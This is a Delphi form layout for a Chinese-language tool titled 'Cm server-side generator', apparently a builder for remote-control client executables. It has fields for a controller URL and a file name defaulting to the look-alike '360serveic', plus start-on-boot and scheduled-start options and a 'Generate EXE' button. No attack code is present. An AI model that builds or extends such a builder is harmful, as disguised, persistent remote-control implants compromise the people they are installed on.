object Ser: TSer
  Left = 729
  Top = 135
  BorderStyle = bsDialog
  Caption = 'Cm'#26381#21153#31471#29983#25104#22120' v1.0'
  ClientHeight = 199
  ClientWidth = 279
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'MS Sans Serif'
  Font.Style = []
  OldCreateOrder = False
  Position = poDefault
  Visible = True
  PixelsPerInch = 96
  TextHeight = 13
  object Label1: TLabel
    Left = 16
    Top = 112
    Width = 225
    Height = 13
    AutoSize = False
    Caption = #27880#24847#19981#35201#22312#25511#21046#31471#22320#22336#21518#38754#21152' /   '
    WordWrap = True
  end
  object Label2: TLabel
    Left = 168
    Top = 88
    Width = 89
    Height = 13
    AutoSize = False
    Caption = #65288#36816#34892#26102#25552#31034#65289
  end
  object Label3: TLabel
    Left = 168
    Top = 24
    Width = 81
    Height = 13
    AutoSize = False
    Caption = #65288#26381#21153#26631#35782#65289
  end
  object Label4: TLabel
    Left = 168
    Top = 56
    Width = 81
    Height = 13
    AutoSize = False
    Caption = #65288#25991#20214#21517#31216#65289
  end
  object SerUrl: TEdit
    Left = 16
    Top = 128
    Width = 249
    Height = 21
    ImeName = #35895#27468#25340#38899#36755#20837#27861' 2'
    TabOrder = 0
    Text = 'http://'
  end
  object ShengCheng: TButton
    Left = 176
    Top = 160
    Width = 89
    Height = 25
    Caption = #29983#25104'EXE'
    TabOrder = 1
    OnClick = ShengChengClick
  end
  object SerTip: TEdit
    Left = 16
    Top = 80
    Width = 153
    Height = 21
    ImeName = #35895#27468#25340#38899#36755#20837#27861' 2'
    TabOrder = 2
  end
  object SerRun: TCheckBox
    Left = 16
    Top = 164
    Width = 81
    Height = 17
    Caption = #24320#26426#21551#21160
    TabOrder = 3
  end
  object SerFil: TEdit
    Left = 16
    Top = 48
    Width = 153
    Height = 21
    ImeName = #35895#27468#25340#38899#36755#20837#27861' 2'
    TabOrder = 4
    Text = '360serveic'
  end
  object SerRat: TCheckBox
    Left = 96
    Top = 164
    Width = 89
    Height = 17
    Caption = #35745#21010#21551#21160
    TabOrder = 5
  end
  object SerKey: TEdit
    Left = 16
    Top = 16
    Width = 153
    Height = 21
    TabOrder = 6
    Text = 'CmHost'
  end
end
